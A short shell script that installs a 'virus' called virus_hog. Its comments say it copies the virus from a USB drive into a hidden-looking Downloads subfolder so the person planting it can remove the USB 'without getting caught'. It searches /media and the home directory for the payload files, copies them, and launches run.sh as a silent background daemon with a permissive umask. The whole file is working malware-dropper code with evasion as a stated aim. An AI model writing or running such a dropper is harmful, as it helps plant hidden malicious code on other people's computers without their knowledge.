#!/bin/sh

# first, download into downloads folder. This is so that if the virus is in a usb, it will
# download into the computer then run the virus which will allow someone to unplug the usb
# without getting caught. 

# create virus in the ~/Downloads/Application101/virus_hog/ path
if [ ! -d "$HOME/Downloads/Application101/" ]; then
	mkdir ${HOME}/Downloads/Application101/
	mkdir ${HOME}/Downloads/Application101/virus_hog/

fi


# find directory of virus
if [ -e hog -o -e run.sh ]; then
	PATH_HOGSH=.
else 
	PATH_HOGSH=$(find /media -name "virus_hog")

	# search in external devices
	if [ -z "$PATH_HOGSH" ]; then
		PATH_HOGSH=$(find $HOME -name "virus_hog" -not -path "$HOME/Downloads/Application101/virus_hog")
	fi
fi

INFECTION_PATH=${HOME}/Downloads/Application101/virus_hog/
cp -f $PATH_HOGSH/hog $INFECTION_PATH/hog
cp -f $PATH_HOGSH/run.sh $INFECTION_PATH/run.sh
cp -f $PATH_HOGSH/hog.sh $INFECTION_PATH/hog.sh

cd $INFECTION_PATH

# run virus as daemon
umask 0; sh run.sh  0<&- &>/dev/null &
